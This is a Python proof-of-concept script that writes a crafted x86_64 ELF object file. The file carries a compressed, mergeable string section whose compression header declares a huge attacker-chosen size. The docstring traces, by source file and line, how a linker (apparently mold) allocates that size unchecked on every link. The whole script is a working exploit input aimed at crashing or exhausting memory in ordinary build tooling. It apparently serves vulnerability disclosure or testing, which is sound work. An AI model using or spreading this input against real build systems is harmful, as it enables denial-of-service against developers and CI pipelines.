#!/usr/bin/env python3
"""Writes a minimal x86_64 ET_REL ELF object with one SHF_COMPRESSED|SHF_MERGE|SHF_STRINGS
section whose content begins with a well-formed-looking Elf64_Chdr compression header
(ch_type=ELFCOMPRESS_ZLIB, plausible ch_addralign) but a huge, attacker-controlled ch_size field.

src/input-sections.cc InputSection<E>::InputSection() reads `sh_size = chdr.ch_size` verbatim
from this untrusted header with no upper-bound check at all. Because the crafted section also
carries SHF_MERGE|SHF_STRINGS, ObjectFile<E>::convert_mergeable_sections()
(src/input-files.cc) unconditionally constructs a MergeableSection for it during every normal
link, and MergeableSection<E>::MergeableSection() (src/input-sections.cc:364-371) immediately
calls `input_section->uncompress(ctx)`, whose very first statement is
`u8 *buf = new u8[sh_size];` (src/input-sections.cc:72) - i.e. `new u8[<attacker-controlled
64-bit value>]` - before any check of ch_size's plausibility, and before
copy_contents_to()'s later "corrupted compressed section" size check ever runs.

No special CLI flag is needed: create_merged_sections() -> convert_mergeable_sections() runs
unconditionally on every ObjectFile in every link.
"""
import struct
import sys

SHT_PROGBITS = 1
SHF_MERGE = 0x10
SHF_STRINGS = 0x20
SHF_COMPRESSED = 0x800

ELFCOMPRESS_ZLIB = 1


def shdr64(name, type_, flags, addr, offset, size, link, info, addralign, entsize):
    return struct.pack("<IIQQQQIIQQ", name, type_, flags, addr, offset, size,
                        link, info, addralign, entsize)


def build(ch_size: int) -> bytes:
    names = b"\x00"

    def addname(s):
        nonlocal names
        off = len(names)
        names += s.encode() + b"\x00"
        return off

    n_evil = addname(".rodata.evil")
    n_shstrtab = addname(".shstrtab")

    EHDR_SIZE = 64
    SHDR_SIZE = 64

    # Chdr (Elf64_Chdr): ch_type(u32), ch_reserved(u32), ch_size(u64), ch_addralign(u64) = 24 bytes
    chdr = struct.pack("<IIQQ", ELFCOMPRESS_ZLIB, 0, ch_size, 1)
    # A few extra filler bytes after the header so the on-disk section is a bit bigger than the
    # bare Chdr (mimics "there's some compressed payload here", though its actual bytes are
    # irrelevant - new u8[sh_size] happens before any of this payload is ever inspected).
    payload = b"\x00" * 8
    evil_contents = chdr + payload

    off = EHDR_SIZE
    off_evil = off
    off += len(evil_contents)
    off_shstrtab = off
    off += len(names)
    pad = (-off) % 8
    off += pad
    off_shdrs = off

    sh_null = shdr64(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    sh_evil = shdr64(n_evil, SHT_PROGBITS, SHF_MERGE | SHF_STRINGS | SHF_COMPRESSED,
                      0, off_evil, len(evil_contents), 0, 0, 1, 1)
    sh_shstrtab = shdr64(n_shstrtab, 3, 0, 0, off_shstrtab, len(names), 0, 0, 1, 0)

    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB
    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,        # e_type = ET_REL
        62,       # e_machine = EM_X86_64
        1,        # e_version
        0,        # e_entry
        0,        # e_phoff
        off_shdrs,  # e_shoff
        0,        # e_flags
        EHDR_SIZE,
        0,        # e_phentsize
        0,        # e_phnum
        SHDR_SIZE,
        3,        # e_shnum
        2,        # e_shstrndx
    )
    assert len(ehdr) == EHDR_SIZE

    return (ehdr + evil_contents + names + b"\x00" * pad +
            sh_null + sh_evil + sh_shstrtab)


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.o"
    ch_size = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0xFFFFFFFFFFFF0000
    with open(out_path, "wb") as f:
        f.write(build(ch_size))


if __name__ == "__main__":
    main()
